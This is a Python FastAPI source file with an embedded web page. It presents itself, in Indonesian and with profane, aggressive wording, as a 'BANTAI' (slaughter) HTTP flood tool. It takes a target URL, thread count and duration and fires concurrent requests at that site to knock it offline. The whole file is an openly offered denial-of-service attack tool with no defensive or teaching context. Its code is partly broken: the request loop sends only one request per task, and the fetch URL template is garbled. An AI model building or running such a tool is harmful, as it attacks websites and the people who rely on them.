from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
import httpx
import asyncio
import random
import uvicorn
import time

app = FastAPI(title="ZORA DARK GANAS - BANTAI MODE")

# UI dark serem brutal (semua inline, no escape issue)
DARK_HTML = r"""
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ZORA DARK GANAS - BANTAI</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background: #000000; color: #ff0000; font-family: monospace; overflow: hidden; }
    .glitch { animation: glitch 0.8s infinite; text-shadow: 0 0 20px #f00, 0 0 40px #f00; }
    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-8px, 8px); text-shadow: 8px 0 #f00, -8px 0 #0f0; }
      40% { transform: translate(8px, -8px); text-shadow: -8px 0 #f00, 8px 0 #0f0; }
      60% { transform: translate(-8px, 8px); }
      80% { transform: translate(8px, -8px); }
      100% { transform: translate(0); }
    }
    #log { background: #0a0000; border: 4px solid #660000; height: 300px; overflow-y: auto; padding: 1.5rem; font-size: 1.2rem; }
    .blood { color: #ff3333; font-weight: bold; }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4 relative">
  <div class="absolute inset-0 bg-gradient-to-b from-transparent via-red-950/40 to-black pointer-events-none"></div>
  <h1 class="text-8xl md:text-9xl font-black glitch mb-8 z-10">ZORA GANAS</h1>
  <p class="text-4xl mb-10 text-red-700 tracking-widest z-10">BLOOD MODE - FUCK EVERYTHING</p>

  <input id="target" placeholder="TARGET URL (https://anjing.com)" class="w-full max-w-3xl p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-3xl mb-8 focus:border-red-600 z-10">

  <div class="w-full max-w-3xl grid grid-cols-2 gap-6 mb-8 z-10">
    <input id="threads" type="number" value="50" min="1" max="200" placeholder="Threads (max 200)" class="p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-2xl">
    <input id="duration" type="number" value="300" min="10" max="1800" placeholder="Duration (detik)" class="p-6 bg-black border-4 border-red-900 rounded-2xl text-red-300 text-2xl">
  </div>

  <div class="w-full max-w-3xl flex gap-6 z-10">
    <button id="startBtn" class="flex-1 bg-gradient-to-r from-red-950 to-black hover:from-red-800 hover:to-red-900 text-white font-black py-8 px-12 rounded-2xl text-4xl transition transform hover:scale-110 shadow-2xl shadow-red-950">
      BANTAI SEKARANG 🔥
    </button>
    <button id="stopBtn" disabled class="flex-1 bg-gray-900 text-gray-600 font-black py-8 px-12 rounded-2xl text-4xl cursor-not-allowed">
      STOP
    </button>
  </div>

  <div id="log" class="w-full max-w-3xl mt-10 p-8 bg-black border-4 border-red-900 rounded-2xl text-green-500 text-xl font-mono overflow-y-auto max-h-[500px] z-10">
    Zora ganas mode ON... Siap bantai target lu boss.
  </div>

  <script>
    const log = document.getElementById('log');
    let attacking = false;

    document.getElementById('startBtn').onclick = async () => {
      if (attacking) return;
      const target = document.getElementById('target').value.trim();
      if (!target || !target.startsWith('http')) {
        alert('URL salah kontol! Harus https:// atau http://');
        return;
      }
      const threads = parseInt(document.getElementById('threads').value) || 50;
      const duration = parseInt(document.getElementById('duration').value) || 300;

      attacking = true;
      document.getElementById('startBtn').disabled = true;
      document.getElementById('stopBtn').disabled = false;
      log.innerHTML += '<br><span class="blood">[BANTAI START]</span> Target: ' + target + ' | Threads: ' + threads + ' | Durasi: ' + duration + 's';

      try {
        const res = await fetch(`/flood?target=\( {encodeURIComponent(target)}&threads= \){threads}&duration=${duration}`);
        const txt = await res.text();
        log.innerHTML += '<br><span class="blood">' + txt + '</span>';
      } catch (e) {
        log.innerHTML += '<br><span class="text-yellow-500">[ERROR]</span> ' + e;
      }
      attacking = false;
      document.getElementById('startBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;
    };

    document.getElementById('stopBtn').onclick = () => {
      log.innerHTML += '<br><span class="text-yellow-500">[STOPPED]</span> Bantai dihentikan.';
      attacking = false;
      document.getElementById('startBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;
    };
  </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def root():
    return DARK_HTML

@app.get("/flood")
async def flood(target: str = Query(...), threads: int = Query(50, ge=1, le=200), duration: int = Query(300, ge=10, le=1800)):
    start_time = time.time()
    count = 0
    success = 0
    failed = 0

    async def send_request():
        nonlocal count, success, failed
        async with httpx.AsyncClient(timeout=httpx.Timeout(5.0, connect=3.0)) as client:
            try:
                resp = await client.get(target, follow_redirects=True)
                if resp.status_code < 400:
                    success += 1
                count += 1
            except Exception:
                failed += 1
                count += 1

    tasks = [asyncio.create_task(send_request()) for _ in range(threads)]
    await asyncio.sleep(duration)
    for t in tasks:
        t.cancel()

    elapsed = time.time() - start_time
    return f"[ZORA GANAS] Serangan selesai!\nRequests total: {count}\nSukses: {success}\nGagal: {failed}\nDurasi real: {elapsed:.1f}s\nTarget: {target}\nStatus: BANTAI DULUAN!"

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
